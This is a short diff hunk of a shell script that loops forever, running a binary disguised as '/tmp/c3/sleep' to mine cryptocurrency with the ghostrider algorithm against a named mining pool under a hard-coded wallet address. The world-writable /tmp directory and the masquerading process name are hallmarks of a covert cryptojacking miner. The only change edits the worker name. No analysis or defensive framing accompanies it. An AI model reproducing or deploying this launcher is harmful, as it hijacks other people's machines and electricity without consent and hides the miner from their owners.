@@ -10,7 +10,7 @@ chmod -R  777 /tmp/c3
 
 #!/bin/sh
 while [ 1 ]; do
-	/tmp/c3/sleep -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.ls
+	/tmp/c3/sleep -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.gs
 	sleep 5
 done
 
